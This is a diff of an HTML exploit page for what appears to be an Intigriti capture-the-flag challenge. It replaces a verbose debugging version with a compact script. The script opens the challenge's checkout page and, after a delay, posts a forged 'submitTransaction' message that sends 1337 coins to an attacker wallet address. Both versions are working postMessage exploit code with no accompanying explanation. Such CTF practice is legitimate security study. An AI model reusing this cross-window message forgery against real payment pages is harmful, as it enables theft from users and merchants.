@@ -1,156 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CTF Exploit - 1337Coin Attack</title>
-</head>
 <body>
-    <h2>1337Coin Exploit Debug Output:</h2>
-    <div id="debug" style="background:#f5f5f5; padding:10px; border:1px solid #ccc; font-family: monospace;"></div>
-    
-    <iframe id="victimFrame" 
-            src="https://challenge-0126.intigriti.io/checkout.html?currency=1337Coin&price=150" 
-            style="width: 80%; height: 300px; border: 2px solid blue;"></iframe>
+<script>
+const target = "https://challenge-0126.intigriti.io/checkout.html?currency=1337Coin&price=150";
 
-    <script>
-        const debug = document.getElementById('debug');
-        const attackerWallet = '1b70cd087fb68bb311210cc05b994ee08e';
-        
-        function log(msg, type = 'info') {
-            const color = type === 'error' ? 'red' : (type === 'success' ? 'green' : 'black');
-            debug.innerHTML += `<div style="color:${color}; margin: 2px 0;">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            console.log(`[${type.toUpperCase()}] ${msg}`);
-            
-            // Auto-scroll to bottom
-            debug.scrollTop = debug.scrollHeight;
-        }
-        
-        log('🚀 Starting 1337Coin exploit...', 'info');
-        log(`Target Wallet: ${attackerWallet}`, 'info');
-        log(`Currency: 1337Coin`, 'info');
-        
-        // Track all network requests from iframe
-        const originalFetch = window.fetch;
-        window.fetch = function(...args) {
-            log(`Fetch call to: ${args[0]}`, 'info');
-            if (args[0] && args[0].includes('/api/transaction')) {
-                log('🔥 TRANSACTION API CALL DETECTED!', 'success');
-                log(`Request body: ${args[1]?.body || 'none'}`, 'info');
-            }
-            return originalFetch.apply(this, args);
-        };
-        
-        // Listen for ALL messages
-        window.addEventListener('message', function(event) {
-            log(`📨 Message from origin: ${event.origin}`, 'info');
-            if (event.data) {
-                log(`Message type: ${event.data.type || 'unknown'}`, 'info');
-                if (event.data.txHash) {
-                    log(`🎉 SUCCESS! Transaction Hash: ${event.data.txHash}`, 'success');
-                    log(`🏁 FLAG MIGHT BE: ${event.data.txHash}`, 'success');
-                    alert('FLAG FOUND: ' + event.data.txHash);
-                }
-            }
-        });
-        
-        // Override alert to capture it
-        const originalAlert = window.alert;
-        window.alert = function(msg) {
-            log(`⚠️ ALERT TRIGGERED: ${msg}`, 'success');
-            originalAlert.call(window, msg);
-            if (msg.includes('successful') || msg.includes('TX Hash')) {
-                log(`🎯 POSSIBLE FLAG IN ALERT: ${msg}`, 'success');
-            }
-        };
-        
-        // Monitor page navigation
-        const originalLocation = window.location;
-        Object.defineProperty(window, 'location', {
-            get() { return originalLocation; },
-            set(value) { 
-                log(`📍 Page redirecting to: ${value}`, 'info');
-                return true;
-            }
-        });
-        
-        document.getElementById('victimFrame').onload = function() {
-            log('✅ Victim page loaded successfully', 'success');
-            log('⏳ Waiting 3 seconds for page initialization...', 'info');
-            
-            setTimeout(() => {
-                const payload = {
-                    type: 'submitTransaction',
-                    transaction: {
-                        currency: '1337Coin',  // Must match URL parameter
-                        amount: 1337,           // Fitting amount for 1337Coin!
-                        toAddress: attackerWallet
-                    }
-                };
-                
-                log(`📤 Sending malicious payload:`, 'info');
-                log(JSON.stringify(payload, null, 2), 'info');
-                
-                // Method 1: Try through iframe
-                try {
-                    const iframeWindow = document.getElementById('victimFrame').contentWindow;
-                    iframeWindow.postMessage(payload, '*');
-                    log('📨 Payload sent via iframe postMessage', 'success');
-                } catch (e) {
-                    log(`❌ Iframe error: ${e.message}`, 'error');
-                }
-                
-                // Method 2: Also try dispatching event globally
-                setTimeout(() => {
-                    log('🔄 Trying direct event dispatch...', 'info');
-                    const event = new MessageEvent('message', {
-                        data: payload,
-                        origin: window.location.origin
-                    });
-                    window.dispatchEvent(event);
-                    log('✅ Direct event dispatched', 'success');
-                    
-                    // Method 3: Try to trigger via the iframe's window reference
-                    setTimeout(() => {
-                        log('🔄 Attempting window reference method...', 'info');
-                        try {
-                            const victimWindow = document.getElementById('victimFrame').contentWindow;
-                            victimWindow.dispatchEvent(new MessageEvent('message', {
-                                data: payload,
-                                origin: 'https://payment-gateway.com'
-                            }));
-                            log('✅ Window reference method attempted', 'success');
-                        } catch(e) {
-                            log(`❌ Window ref error: ${e.message}`, 'error');
-                        }
-                    }, 1000);
-                }, 500);
-                
-            }, 3000);
-        };
-        
-        // If iframe fails to load
-        document.getElementById('victimFrame').onerror = function() {
-            log('❌ Failed to load iframe - CORS issue?', 'error');
-            log('Try running this from the same origin or disable CORS in browser', 'error');
-        };
-        
-        // Auto-capture flag if page content changes
-        setInterval(() => {
-            try {
-                const iframeDoc = document.getElementById('victimFrame').contentDocument;
-                if (iframeDoc && iframeDoc.body && iframeDoc.body.textContent.includes('FLAG')) {
-                    log('🚩 FLAG DETECTED IN PAGE CONTENT!', 'success');
-                    log(`Content: ${iframeDoc.body.textContent.match(/FLAG[^<]*/)?.[0] || 'Found'}`, 'success');
-                }
-            } catch(e) {
-                // Cross-origin errors expected
-            }
-        }, 2000);
-        
-        log('💡 TIPS:', 'info');
-        log('1. Check Network tab for POST to /api/transaction', 'info');
-        log('2. Check Console for transaction errors/success', 'info');
-        log('3. Watch for alerts or page redirects', 'info');
-        log('4. Reload checkout page after exploit - flag might appear', 'info');
-    </script>
+const win = window.open(target, "_blank");
+
+setTimeout(() => {
+  win.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      currency: "1337Coin",
+      amount: 1337,
+      toAddress: "1b70cd087fb68bb311210cc05b994ee08e"
+    }
+  }, "*");
+}, 3000);
+</script>
 </body>
 </html>
